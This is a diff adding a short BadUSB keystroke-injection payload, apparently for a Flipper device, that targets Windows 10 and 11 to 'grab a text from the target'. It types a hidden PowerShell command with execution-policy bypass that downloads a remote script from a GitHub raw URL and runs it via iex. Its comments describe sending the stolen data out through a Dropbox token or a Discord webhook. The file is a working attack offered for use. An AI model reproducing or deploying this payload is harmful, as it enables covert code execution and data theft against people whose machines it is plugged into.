@@ -1,0 +1,17 @@
+REM     Title: Text Input
+
+REM     Author: I am Turtle
+
+REM     Description: This payload will grab a text from the target
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass;irm https://raw.githubusercontent.com/StuartChristhilf/Flipper/refs/heads/main/textInput.ps1?token=GHSAT0AAAAAAC3ZMGQWB3NFG7XFC2XV5D6OZ22EVLQ | iex
+ENTER
+
+REM     Fill in either variable or both to set your exfil method.
+REM     $db is the variable that holds your DropBox token.
+REM     $dc is the variable that holds your Discord webhook.   
+REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
